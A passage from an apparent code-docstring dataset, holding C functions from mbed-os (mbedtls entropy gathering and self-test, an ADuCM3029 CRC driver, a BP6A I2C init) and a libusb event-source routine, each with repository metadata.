buf1 ) );\n\n    if( ( ret = mbedtls_entropy_source_self_test_gather( buf0, sizeof( buf0 ) ) ) != 0 )\n        goto cleanup;\n    if( ( ret = mbedtls_entropy_source_self_test_gather( buf1, sizeof( buf1 ) ) ) != 0 )\n        goto cleanup;\n\n    /* Make sure that the returned values are not all 0 or 1 */\n    if( ( ret = mbedtls_entropy_source_self_test_check_bits( buf0, sizeof( buf0 ) ) ) != 0 )\n        goto cleanup;\n    if( ( ret = mbedtls_entropy_source_self_test_check_bits( buf1, sizeof( buf1 ) ) ) != 0 )\n        goto cleanup;\n\n    /* Make sure that the entropy source is not returning values in a\n     * pattern */\n    ret = memcmp( buf0, buf1, sizeof( buf0 ) ) == 0;\n\ncleanup:\n    if( verbose != 0 )\n    {\n        if( ret != 0 )\n            mbedtls_printf( \"failed\\n\" );\n        else\n            mbedtls_printf( \"passed\\n\" );\n\n        mbedtls_printf( \"\\n\" );\n    }\n\n    return( ret != 0 );\n}", "path": "mbed-os/connectivity/mbedtls/source/entropy.c", "commit_date": "2020-08-11 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/**\n * @brief       Completes a DMA driven CRC operation by dealing with remaining\n *              data, usually when the number of bytes left is smaller than 4.\n *\n * @param [in]  pDevice         Pointer to CRC device\n * @param [in]  pData           Address of data buffer.\n * @param [in]  NumBytes        Number of whole bytes in data buffer.\n * @param [in]  NumBits         Number of bits, 0 to 7, in the last partial byte\n *                              in CRC data buffer\n */\n", "func_signal": "static void crc_CalculateCrcForRemaining(ADI_CRC_DEVICE *pDevice, uint8_t *pData, uint32_t NumBytes, uint32_t NumBits)", "code": "{\n    /* process the remaining bytes */\n    while (NumBytes > 0u)\n    {\n        pDevice->pReg->IPBYTE = *pData;\n        pData++;\n        NumBytes--;\n    }\n\n    /* process the remaining bits in the last byte if the number of bits is smaller than 8 */\n    if (NumBits > 0u)\n    {\n        pDevice->pReg->IPBITS[NumBits] = *pData;\n    }\n}", "path": "mbed-os/targets/TARGET_Analog_Devices/TARGET_ADUCM302X/TARGET_ADUCM3029/bsp/crc/adi_crc.c", "commit_date": "2017-11-15 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/******************************************************************************\n* Public function\n******************************************************************************/\n", "func_signal": "void bp6a_i2c_master_init(uint32_t index, uint32_t freq, int addr_len)", "code": "{\n    bp6a_i2c_priv_t *priv = &bp6a_i2c_priv[index];\n\n    priv->master = true;\n    priv->xfer_speed = freq;\n    priv->addrlen = addr_len;\n    bp6a_cmu_enable_clock((cmu_clock_t)(CMU_I2C0_CLK + index), true);\n    bp6a_i2c_reset(index);\n\n    bp6a_i2c_set_master_addr(priv, I2C_DEFAULT_MASTER_ADDRESS);\n    /* Set master mode */\n    bp6a_i2c_set_ctl_mode(priv);\n    priv->timeout = 0xFFFF;\n    bp6a_i2c_set_timeout(priv);\n    /* Set speed */\n    bp6a_i2c_calculate_timing(priv);\n    bp6a_i2c_reset_rxFIFO(priv);\n    bp6a_i2c_reset_txFIFO(priv);\n    bp6a_i2c_enable_isr(priv);\n}", "path": "mbed-os/targets/TARGET_Samsung/TARGET_SIDK_S1SBP6A/device/s1sbp6a_i2c.c", "commit_date": "2020-08-11 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/*\n * Entropy accumulator update\n */\n", "func_signal": "static int entropy_update( mbedtls_entropy_context *ctx, unsigned char source_id,\n                           const unsigned char *data, size_t len )", "code": "{\n    unsigned char header[2];\n    unsigned char tmp[MBEDTLS_ENTROPY_BLOCK_SIZE];\n    size_t use_len = len;\n    const unsigned char *p = data;\n    int ret = 0;\n\n    if( use_len > MBEDTLS_ENTROPY_BLOCK_SIZE )\n    {\n#if defined(MBEDTLS_ENTROPY_SHA512_ACCUMULATOR)\n        if( ( ret = mbedtls_sha512_ret( data, len, tmp, 0 ) ) != 0 )\n            goto cleanup;\n#else\n        if( ( ret = mbedtls_sha256_ret( data, len, tmp, 0 ) ) != 0 )\n            goto cleanup;\n#endif\n        p = tmp;\n        use_len = MBEDTLS_ENTROPY_BLOCK_SIZE;\n    }\n\n    header[0] = source_id;\n    header[1] = use_len & 0xFF;\n\n    /*\n     * Start the accumulator if this has not already happened. Note that\n     * it is sufficient to start the accumulator here only because all calls to\n     * gather entropy eventually execute this code.\n     */\n#if defined(MBEDTLS_ENTROPY_SHA512_ACCUMULATOR)\n    if( ctx->accumulator_started == 0 &&\n        ( ret = mbedtls_sha512_starts_ret( &ctx->accumulator, 0 ) ) != 0 )\n        goto cleanup;\n    else\n        ctx->accumulator_started = 1;\n    if( ( ret = mbedtls_sha512_update_ret( &ctx->accumulator, header, 2 ) ) != 0 )\n        goto cleanup;\n    ret = mbedtls_sha512_update_ret( &ctx->accumulator, p, use_len );\n#else\n    if( ctx->accumulator_started == 0 &&\n        ( ret = mbedtls_sha256_starts_ret( &ctx->accumulator, 0 ) ) != 0 )\n        goto cleanup;\n    else\n        ctx->accumulator_started = 1;\n    if( ( ret = mbedtls_sha256_update_ret( &ctx->accumulator, header, 2 ) ) != 0 )\n        goto cleanup;\n    ret = mbedtls_sha256_update_ret( &ctx->accumulator, p, use_len );\n#endif\n\ncleanup:\n    mbedtls_platform_zeroize( tmp, sizeof( tmp ) );\n\n    return( ret );\n}", "path": "mbed-os/connectivity/mbedtls/source/entropy.c", "commit_date": "2020-08-11 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/*\n * Thread-safe wrapper for entropy_gather_internal()\n */\n", "func_signal": "int mbedtls_entropy_gather( mbedtls_entropy_context *ctx )", "code": "{\n    int ret = MBEDTLS_ERR_ERROR_CORRUPTION_DETECTED;\n\n#if defined(MBEDTLS_THREADING_C)\n    if( ( ret = mbedtls_mutex_lock( &ctx->mutex ) ) != 0 )\n        return( ret );\n#endif\n\n    ret = entropy_gather_internal( ctx );\n\n#if defined(MBEDTLS_THREADING_C)\n    if( mbedtls_mutex_unlock( &ctx->mutex ) != 0 )\n        return( MBEDTLS_ERR_THREADING_MUTEX_ERROR );\n#endif\n\n    return( ret );\n}", "path": "mbed-os/connectivity/mbedtls/source/entropy.c", "commit_date": "2020-08-11 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/**\n * @brief       Sets the initial seed value for the CRC operation that is about to take place.\n *\n * @param [in]  hDevice         Handle to CRC device instance to work on.\n * @param [in]  CrcSeedVal      Initial seed value for the CRC operation that is about to take place.\n *\n * @return      Status\n *              - #ADI_CRC_SUCCESS: Successfully set CRC seed value.\n *              - #ADI_CRC_BAD_HANDLE [D]: Supplied CRC handle is invalid.\n *              - #ADI_CRC_FN_NOT_PERMITTED [D] : Function not permitted when CRC operation is in progress.\n *\n */\n", "func_signal": "ADI_CRC_RESULT adi_crc_SetCrcSeedVal(\n    ADI_CRC_HANDLE const    hDevice,\n    uint32_t                CrcSeedVal)", "code": "{\n    ADI_CRC_RESULT result = ADI_CRC_SUCCESS;\n    ADI_CRC_DEVICE *pDevice = HDL_TO_DEVICE_PTR(hDevice);\n\n#ifdef ADI_DEBUG\n    if (NULL == pDevice)                                /* IF (CRC device handle is invalid) */\n    {\n        result = ADI_CRC_BAD_HANDLE;\n    }\n    else if (!ADI_CRC_DEVICE_IS_IDLE(pDevice))          /* IF (CRC in progress) */\n    {\n        result = ADI_CRC_FN_NOT_PERMITTED;              /* function not permitted when CRC operation is in progress */\n    }\n    else\n#endif /* ADI_DEBUG */\n    {\n        pDevice->pReg->RESULT = CrcSeedVal;             /* Load the CRC seed value */\n    }\n    return result;\n}", "path": "mbed-os/targets/TARGET_Analog_Devices/TARGET_ADUCM302X/TARGET_ADUCM3029/bsp/crc/adi_crc.c", "commit_date": "2017-11-15 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/*\n * Dummy source function\n */\n", "func_signal": "static int entropy_dummy_source( void *data, unsigned char *output,\n                                 size_t len, size_t *olen )", "code": "{\n    ((void) data);\n\n    memset( output, 0x2a, len );\n    *olen = len;\n\n    return( 0 );\n}", "path": "mbed-os/connectivity/mbedtls/source/entropy.c", "commit_date": "2020-08-11 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/**\n * @brief       Gets the current CRC peripheral status.\n *\n * @param [in]  hDevice         Handle to CRC device instance to work on\n * @param [in]  pbCrcInProgress Pointer to location to store the current status of CRC peripheral.\n *                              'true' when CRC peripheral is in currently performing a CRC operation.\n *\n * @return      Status\n *              - #ADI_CRC_SUCCESS: Successfully set expected CRC result.\n *              - #ADI_CRC_BAD_HANDLE [D}: Supplied CRC handle is invalid.\n *\n * @note        This function is valid only when device is operating in DMA mode.\n *\n */\n", "func_signal": "ADI_CRC_RESULT adi_crc_IsCrcInProgress(\n    ADI_CRC_HANDLE const    hDevice,\n    bool                    *pbCrcInProgress)", "code": "{\n    ADI_CRC_RESULT result = ADI_CRC_SUCCESS;\n    ADI_CRC_DEVICE *pDevice = HDL_TO_DEVICE_PTR(hDevice);\n\n#ifdef ADI_DEBUG\n    if (NULL == pDevice)        /* IF (CRC device handle is invalid) */\n    {\n        result = ADI_CRC_BAD_HANDLE;\n    }\n    else\n#endif /* ADI_DEBUG */\n    {\n\n      if ((pDevice)->eCrcOpStatus == ADI_CRC_OP_IN_PROGRESS) \n      {\n                *pbCrcInProgress = true;\n\n      } \n      else \n      {\n                *pbCrcInProgress = false;\n\n      }\n    }\n    return result;\n}", "path": "mbed-os/targets/TARGET_Analog_Devices/TARGET_ADUCM302X/TARGET_ADUCM3029/bsp/crc/adi_crc.c", "commit_date": "2017-11-15 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/**\n * @brief       Callback function used by the DMA when a DMA error occurs\n *\n * @details     Callback function used by the DMA when a DMA error must be reported\n *              to the CRC driver because it affects the DMA channel driving the CRC.\n */\n", "func_signal": "static void CRC_Callback_For_DMA_Err_Int_Handler(void *pcbparam, uint32_t nEvent, void *pArg)", "code": "{\n    ADI_CRC_DEVICE *pDevice = HDL_TO_DEVICE_PTR(pcbparam);\n\n    if (NULL != pDevice)\n    {\n        /* DMA error detected */\n        pDevice->eCrcOpStatus = ADI_CRC_OP_IDLE;                /* mark the CRC peripheral as IDLE */\n        pDevice->pReg->CTL &= (uint32_t)(~(BITM_CRC_CTL_EN));   /* disable CRC peripheral */\n    }\n}", "path": "mbed-os/targets/TARGET_Analog_Devices/TARGET_ADUCM302X/TARGET_ADUCM3029/bsp/crc/adi_crc.c", "commit_date": "2017-11-15 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/**\n * @brief       Sets the 32-bit polynomial for CRC operations.\n *\n * @param [in]  hDevice         Handle to CRC device instance to work on.\n * @param [in]  PolynomialVal   32-bit CRC polynomial to use for CRC operation.\n *\n * @return      Status\n *              - #ADI_CRC_SUCCESS: Successfully set polynomial value.\n *              - #ADI_CRC_BAD_HANDLE [D]: Supplied CRC handle is invalid.\n *              - #ADI_CRC_FN_NOT_PERMITTED [D]: Function not permitted when CRC operation is in progress.\n *\n */\n", "func_signal": "ADI_CRC_RESULT adi_crc_SetPolynomialVal(\n    ADI_CRC_HANDLE const    hDevice,\n    uint32_t                PolynomialVal)", "code": "{\n    ADI_CRC_RESULT result = ADI_CRC_SUCCESS;\n    ADI_CRC_DEVICE *pDevice = HDL_TO_DEVICE_PTR(hDevice);\n\n#ifdef ADI_DEBUG\n    if (NULL == pDevice)                                /* IF (CRC device handle is invalid) */\n    {\n        result = ADI_CRC_BAD_HANDLE;\n    }\n    else if (!ADI_CRC_DEVICE_IS_IDLE(pDevice))          /* IF (CRC in progress) */\n    {\n        result = ADI_CRC_FN_NOT_PERMITTED;              /* function not permitted when CRC operation is in progress */\n    }\n    else\n#endif /* ADI_DEBUG */\n    {\n        pDevice->pReg->POLY = PolynomialVal;            /* Load Polynomial value */\n    }\n    return result;\n}", "path": "mbed-os/targets/TARGET_Analog_Devices/TARGET_ADUCM302X/TARGET_ADUCM3029/bsp/crc/adi_crc.c", "commit_date": "2017-11-15 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/**< Maximum amount to loop before error */\n", "func_signal": "void mbedtls_entropy_init( mbedtls_entropy_context *ctx )", "code": "{\n    ctx->source_count = 0;\n    memset( ctx->source, 0, sizeof( ctx->source ) );\n\n#if defined(MBEDTLS_THREADING_C)\n    mbedtls_mutex_init( &ctx->mutex );\n#endif\n\n    ctx->accumulator_started = 0;\n#if defined(MBEDTLS_ENTROPY_SHA512_ACCUMULATOR)\n    mbedtls_sha512_init( &ctx->accumulator );\n#else\n    mbedtls_sha256_init( &ctx->accumulator );\n#endif\n#if defined(MBEDTLS_HAVEGE_C)\n    mbedtls_havege_init( &ctx->havege_data );\n#endif\n\n    /* Reminder: Update ENTROPY_HAVE_STRONG in the test files\n     *           when adding more strong entropy sources here. */\n\n#if defined(MBEDTLS_TEST_NULL_ENTROPY)\n    mbedtls_entropy_add_source( ctx, mbedtls_null_entropy_poll, NULL,\n                                1, MBEDTLS_ENTROPY_SOURCE_STRONG );\n#endif\n\n#if !defined(MBEDTLS_NO_DEFAULT_ENTROPY_SOURCES)\n#if !defined(MBEDTLS_NO_PLATFORM_ENTROPY)\n    mbedtls_entropy_add_source( ctx, mbedtls_platform_entropy_poll, NULL,\n                                MBEDTLS_ENTROPY_MIN_PLATFORM,\n                                MBEDTLS_ENTROPY_SOURCE_STRONG );\n#endif\n#if defined(MBEDTLS_TIMING_C)\n    mbedtls_entropy_add_source( ctx, mbedtls_hardclock_poll, NULL,\n                                MBEDTLS_ENTROPY_MIN_HARDCLOCK,\n                                MBEDTLS_ENTROPY_SOURCE_WEAK );\n#endif\n#if defined(MBEDTLS_HAVEGE_C)\n    mbedtls_entropy_add_source( ctx, mbedtls_havege_poll, &ctx->havege_data,\n                                MBEDTLS_ENTROPY_MIN_HAVEGE,\n                                MBEDTLS_ENTROPY_SOURCE_STRONG );\n#endif\n#if defined(MBEDTLS_ENTROPY_HARDWARE_ALT)\n    mbedtls_entropy_add_source( ctx, mbedtls_hardware_poll, NULL,\n                                MBEDTLS_ENTROPY_MIN_HARDWARE,\n                                MBEDTLS_ENTROPY_SOURCE_STRONG );\n#endif\n#if defined(MBEDTLS_ENTROPY_NV_SEED)\n    mbedtls_entropy_add_source( ctx, mbedtls_nv_seed_poll, NULL,\n                                MBEDTLS_ENTROPY_BLOCK_SIZE,\n                                MBEDTLS_ENTROPY_SOURCE_STRONG );\n    ctx->initial_entropy_run = 0;\n#endif\n#endif /* MBEDTLS_NO_DEFAULT_ENTROPY_SOURCES */\n}", "path": "mbed-os/connectivity/mbedtls/source/entropy.c", "commit_date": "2020-08-11 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/*!\n * @brief       Set the bit mirroring. This function should be called only when device is idle,\n *              i.e. when no data are being processd by the CRC.\n *\n * @param[in]   hDevice     Device handle obtained from adi_crc_Open().\n * @param[in]   bEnable     Boolean flag to enable/disable bit mirroring.\n *                          true : To Enable bit mirroring.\n *                          false :  To Disable bit mirroring.\n *\n * @return      Status\n *              - #ADI_CRC_SUCCESS: Call completed successfully.\n *              - #ADI_CRC_BAD_HANDLE [D] :Invalid device handle parameter.\n *              - #ADI_CRC_FN_NOT_PERMITTED [D]: CRC is executing a request, its parameters cannot be altered.\n *\n * @sa          adi_crc_SetByteMirroring().\n * @sa          adi_crc_SetWordSwap().\n */\n", "func_signal": "ADI_CRC_RESULT adi_crc_SetBitMirroring(ADI_CRC_HANDLE const hDevice, const bool bEnable)", "code": "{\n    ADI_CRC_RESULT result = ADI_CRC_SUCCESS;\n    ADI_CRC_DEVICE *pDevice = HDL_TO_DEVICE_PTR(hDevice);       /* get CRC device pointer from CRC handle */\n\n#ifdef ADI_DEBUG\n    if (NULL == pDevice)                                        /* IF (CRC device handle is invalid) */\n    {\n        result = ADI_CRC_BAD_HANDLE;\n    }\n    else if (!ADI_CRC_DEVICE_IS_IDLE(pDevice))                  /* IF (CRC in progress) */\n    {\n        result = ADI_CRC_FN_NOT_PERMITTED;                      /* Function not permitted when CRC operation is in progress */\n    }\n    else\n#endif\n    if(bEnable == true)\n    {\n        pDevice->pReg->CTL |= (BITM_CRC_CTL_BITMIRR);                   /* enable bit mirroring */\n    }\n    else\n    {\n        pDevice->pReg->CTL &= (uint32_t)(~(BITM_CRC_CTL_BITMIRR));      /* disable bit mirroring */\n    }\n    return result;\n}", "path": "mbed-os/targets/TARGET_Analog_Devices/TARGET_ADUCM302X/TARGET_ADUCM3029/bsp/crc/adi_crc.c", "commit_date": "2017-11-15 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/**\n * @brief       Reset CRC registers to default values\n *\n * @details     Reset CRC registers to default values as defined in configuration.\n *\n * @param [in]  pDevice         Pointer to CRC device\n *\n * @return      None\n */\n", "func_signal": "static void crc_ResetRegisters(ADI_CRC_DEVICE *pDevice)", "code": "{\n    /* Cast the values to be assigned to the targetted types */\n    const uint32_t byte_mirroring_val = (uint32_t) ADI_CFG_CRC_ENABLE_BYTE_MIRRORING;\n    const uint32_t byte_mirroring_pos = (uint32_t) BITP_CRC_CTL_BYTMIRR;\n    const uint32_t bit_mirroring_val  = (uint32_t) ADI_CFG_CRC_ENABLE_BIT_MIRRORING;\n    const uint32_t bit_mirroring_pos  = (uint32_t) BITP_CRC_CTL_BITMIRR;\n    const uint32_t seed_value = (uint32_t) ADI_CFG_CRC_SEED_VALUE;\n    const uint32_t polynomial = (uint32_t) ADI_CFG_CRC_POLYNOMIAL;\n\n    /* Set byte mirroring and bit mirroring in CTL register as configured */\n    pDevice->pReg->CTL = ( (byte_mirroring_val << byte_mirroring_pos)\n                         | (bit_mirroring_val << bit_mirroring_pos)\n                         );\n    pDevice->pReg->RESULT = seed_value;\n    pDevice->pReg->POLY   = polynomial;\n}", "path": "mbed-os/targets/TARGET_Analog_Devices/TARGET_ADUCM302X/TARGET_ADUCM3029/bsp/crc/adi_crc.c", "commit_date": "2017-11-15 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/**\n * @brief       Gets the current/intermediate CRC result computed for a data stream.\n *\n * @param [in]  hDevice           Handle to CRC device instance to work on\n * @param [out] pCurrentCrcVal    Pointer to location where the intermediate CRC result of\n *                                a data stream to be processed will be written.\n *\n * @return      Status\n *              - #ADI_CRC_SUCCESS: Successfully read current CRC result.\n *              - #ADI_CRC_BAD_HANDLE [D]: Supplied CRC handle is invalid.\n */\n", "func_signal": "ADI_CRC_RESULT adi_crc_GetCurrentCrcVal(\n    ADI_CRC_HANDLE const    hDevice,\n    uint32_t                *pCurrentCrcVal)", "code": "{\n    ADI_CRC_RESULT result = ADI_CRC_SUCCESS;\n    ADI_CRC_DEVICE *pDevice = HDL_TO_DEVICE_PTR(hDevice);\n\n#ifdef ADI_DEBUG\n    if (NULL == pDevice)                                /* IF (CRC device handle is invalid) */\n    {\n        result = ADI_CRC_BAD_HANDLE;\n    }\n    else\n#endif /* ADI_DEBUG */\n    {\n        *pCurrentCrcVal = pDevice->pReg->RESULT;        /* Get the current CRC result */\n    }\n\n    return result;\n}", "path": "mbed-os/targets/TARGET_Analog_Devices/TARGET_ADUCM302X/TARGET_ADUCM3029/bsp/crc/adi_crc.c", "commit_date": "2017-11-15 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/*!\n * @brief       Enable the LSB first.\n *\n * @param[in]   hDevice    Device handle obtained from adi_crc_Open().\n * @param[in]   bEnable    Boolean flag which indicate whether LSB first OR MSB first for CRC calculation.\n *                         true  : For LSB First CRC calculation\n *                         false : For MSB First CRC calculation\n *\n * @return      Status\n *              - #ADI_CRC_SUCCESS: Call completed successfully.\n *              - #ADI_CRC_BAD_HANDLE [D]: Invalid device handle parameter.\n *              - #ADI_CRC_FN_NOT_PERMITTED [D]: CRC is executing a request, its parameters cannot be altered.\n *\n *\n * @sa          adi_crc_EnableBitmirroring().\n * @sa          adi_crc_EnableWordSwap().\n */\n", "func_signal": "ADI_CRC_RESULT  adi_crc_SetLSBFirst(ADI_CRC_HANDLE const hDevice, const bool bEnable)", "code": "{\n    ADI_CRC_RESULT result = ADI_CRC_SUCCESS;\n    ADI_CRC_DEVICE *pDevice = HDL_TO_DEVICE_PTR(hDevice);       /* get CRC device pointer from CRC handle */\n\n#ifdef ADI_DEBUG\n    if (NULL == pDevice)                                        /* IF (CRC device handle is invalid) */\n    {\n        result =  ADI_CRC_BAD_HANDLE;\n    }\n    else if (!ADI_CRC_DEVICE_IS_IDLE(pDevice))                  /* IF (CRC in progress) */\n    {\n        result = ADI_CRC_FN_NOT_PERMITTED;                      /* function not permitted when CRC operation is in progress */\n    }\n    else\n#endif\n    if(bEnable == true)\n    {\n       pDevice->pReg->CTL |= (BITM_CRC_CTL_LSBFIRST);           /* enable LSB first (MSB first disable) */\n    }\n    else\n    {\n       pDevice->pReg->CTL &= ~(BITM_CRC_CTL_LSBFIRST);          /* disable LSB first (MSB first enable) */\n    }\n    return result;\n}", "path": "mbed-os/targets/TARGET_Analog_Devices/TARGET_ADUCM302X/TARGET_ADUCM3029/bsp/crc/adi_crc.c", "commit_date": "2017-11-15 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/*!\n * @brief       To enable/disable the word Swap. This function should be called only when device is disabled.\n *\n * @param[in]   hDevice    Device handle obtained from adi_crc_Open().\n * @param[in]   bEnable    Boolean flag to enable/disable word swap.\n *                         true  : To Enable word swap.\n *                         false : To Disable word swap.\n *\n * @return      Status\n *              - #ADI_CRC_SUCCESS: Call completed successfully.\n *              - #ADI_CRC_BAD_HANDLE [D]: Invalid device handle parameter.\n *              - #ADI_CRC_FN_NOT_PERMITTED [D]: CRC is executing a request, its parameters cannot be altered.\n *\n *\n * @sa          adi_crc_SetBitMirroring().\n * @sa          adi_crc_SetByteMirroring().\n */\n", "func_signal": "ADI_CRC_RESULT adi_crc_EnableWordSwap(ADI_CRC_HANDLE const hDevice, const bool bEnable)", "code": "{\n    ADI_CRC_RESULT result = ADI_CRC_SUCCESS;\n    ADI_CRC_DEVICE *pDevice = HDL_TO_DEVICE_PTR(hDevice);\n\n#ifdef ADI_DEBUG\n    if (NULL == pDevice)                                /* IF (CRC device handle is invalid) */\n    {\n        result = ADI_CRC_BAD_HANDLE;\n    }\n    else if (!ADI_CRC_DEVICE_IS_IDLE(pDevice))          /* IF (CRC in progress) */\n    {\n        result = ADI_CRC_FN_NOT_PERMITTED;              /* function not permitted when CRC operation is in progress */\n    }\n    else\n#endif\n    if(bEnable == true)\n    {\n       pDevice->pReg->CTL |= BITM_CRC_CTL_W16SWP;       /* enable word swap */\n    }\n    else\n    {\n       pDevice->pReg->CTL &= ~BITM_CRC_CTL_W16SWP;      /* disable word swap */\n    }\n\n    return result;\n}", "path": "mbed-os/targets/TARGET_Analog_Devices/TARGET_ADUCM302X/TARGET_ADUCM3029/bsp/crc/adi_crc.c", "commit_date": "2017-11-15 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/*\n * The actual entropy quality is hard to test, but we can at least\n * test that the functions don't cause errors and write the correct\n * amount of data to buffers.\n */\n", "func_signal": "int mbedtls_entropy_self_test( int verbose )", "code": "{\n    int ret = 1;\n#if !defined(MBEDTLS_TEST_NULL_ENTROPY)\n    mbedtls_entropy_context ctx;\n    unsigned char buf[MBEDTLS_ENTROPY_BLOCK_SIZE] = { 0 };\n    unsigned char acc[MBEDTLS_ENTROPY_BLOCK_SIZE] = { 0 };\n    size_t i, j;\n#endif /* !MBEDTLS_TEST_NULL_ENTROPY */\n\n    if( verbose != 0 )\n        mbedtls_printf( \"  ENTROPY test: \" );\n\n#if !defined(MBEDTLS_TEST_NULL_ENTROPY)\n    mbedtls_entropy_init( &ctx );\n\n    /* First do a gather to make sure we have default sources */\n    if( ( ret = mbedtls_entropy_gather( &ctx ) ) != 0 )\n        goto cleanup;\n\n    ret = mbedtls_entropy_add_source( &ctx, entropy_dummy_source, NULL, 16,\n                                      MBEDTLS_ENTROPY_SOURCE_WEAK );\n    if( ret != 0 )\n        goto cleanup;\n\n    if( ( ret = mbedtls_entropy_update_manual( &ctx, buf, sizeof buf ) ) != 0 )\n        goto cleanup;\n\n    /*\n     * To test that mbedtls_entropy_func writes correct number of bytes:\n     * - use the whole buffer and rely on ASan to detect overruns\n     * - collect entropy 8 times and OR the result in an accumulator:\n     *   any byte should then be 0 with probably 2^(-64), so requiring\n     *   each of the 32 or 64 bytes to be non-zero has a false failure rate\n     *   of at most 2^(-58) which is acceptable.\n     */\n    for( i = 0; i < 8; i++ )\n    {\n        if( ( ret = mbedtls_entropy_func( &ctx, buf, sizeof( buf ) ) ) != 0 )\n            goto cleanup;\n\n        for( j = 0; j < sizeof( buf ); j++ )\n            acc[j] |= buf[j];\n    }\n\n    for( j = 0; j < sizeof( buf ); j++ )\n    {\n        if( acc[j] == 0 )\n        {\n            ret = 1;\n            goto cleanup;\n        }\n    }\n\n#if defined(MBEDTLS_ENTROPY_HARDWARE_ALT)\n    if( ( ret = mbedtls_entropy_source_self_test( 0 ) ) != 0 )\n        goto cleanup;\n#endif\n\ncleanup:\n    mbedtls_entropy_free( &ctx );\n#endif /* !MBEDTLS_TEST_NULL_ENTROPY */\n\n    if( verbose != 0 )\n    {\n        if( ret != 0 )\n            mbedtls_printf( \"failed\\n\" );\n        else\n            mbedtls_printf( \"passed\\n\" );\n\n        mbedtls_printf( \"\\n\" );\n    }\n\n    return( ret != 0 );\n}", "path": "mbed-os/connectivity/mbedtls/source/entropy.c", "commit_date": "2020-08-11 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/*\n * Run through the different sources to add entropy to our accumulator\n */\n", "func_signal": "static int entropy_gather_internal( mbedtls_entropy_context *ctx )", "code": "{\n    int ret = MBEDTLS_ERR_ENTROPY_SOURCE_FAILED;\n    int i;\n    int have_one_strong = 0;\n    unsigned char buf[MBEDTLS_ENTROPY_MAX_GATHER];\n    size_t olen;\n\n    if( ctx->source_count == 0 )\n        return( MBEDTLS_ERR_ENTROPY_NO_SOURCES_DEFINED );\n\n    /*\n     * Run through our entropy sources\n     */\n    for( i = 0; i < ctx->source_count; i++ )\n    {\n        if( ctx->source[i].strong == MBEDTLS_ENTROPY_SOURCE_STRONG )\n            have_one_strong = 1;\n\n        olen = 0;\n        if( ( ret = ctx->source[i].f_source( ctx->source[i].p_source,\n                        buf, MBEDTLS_ENTROPY_MAX_GATHER, &olen ) ) != 0 )\n        {\n            goto cleanup;\n        }\n\n        /*\n         * Add if we actually gathered something\n         */\n        if( olen > 0 )\n        {\n            if( ( ret = entropy_update( ctx, (unsigned char) i,\n                                        buf, olen ) ) != 0 )\n                return( ret );\n            ctx->source[i].size += olen;\n        }\n    }\n\n    if( have_one_strong == 0 )\n        ret = MBEDTLS_ERR_ENTROPY_NO_STRONG_SOURCE;\n\ncleanup:\n    mbedtls_platform_zeroize( buf, sizeof( buf ) );\n\n    return( ret );\n}", "path": "mbed-os/connectivity/mbedtls/source/entropy.c", "commit_date": "2020-08-11 00:00:00", "repo_name": "ARMmbed/mbed-os", "stars": 4537, "license": "other", "language": "c", "size": 460297}
{"docstring": "/* Remove an event source from the list of event sources to be monitored. */\n", "func_signal": "void usbi_remove_event_source(struct libusb_context *ctx, usbi_os_handle_t os_handle)", "code": "{\n\tstruct usbi_event_source *ievent_source;\n\tint found = 0;\n\n\tusbi_dbg(\"remove \" USBI_OS_HANDLE_FORMAT_STRING, os_handle);\n\tusbi_mutex_lock(&ctx->event_data_lock);\n\tfor_each_event_source(ctx, ievent_source) {\n\t\tif (ievent_source->data.os_handle == os_handle) {\n\t\t\tfound = 1;\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (!found) {\n\t\tusbi_dbg(\"couldn't find \" USBI_OS_HANDLE_FORMAT_STRING \" to remove\", os_handle);\n\t\tusbi_mutex_unlock(&ctx->event_data_lock);\n\t\treturn;\n\t}\n\n\tlist_del(&ievent_source->list);\n\tlist_add_tail(&ievent_source->list, &ctx->removed_event_sources);\n\tusbi_event_source_notification(ctx);\n\tusbi_mutex_unlock(&ctx->event_data_lock);\n\n#if !defined(PLATFORM_WINDOWS)\n\tif (ctx->fd_removed_cb)\n\t\tctx->fd_removed_cb(os_handle, ctx->fd_cb_user_data);\n#endif\n}", "path": "libusb/libusb/io.c", "commit_date": "2020-10-16 00:00:00", "repo_name": "libusb/libusb", "stars": 4883, "license": "lgpl-2.1", "language": "c", "size": 4996}
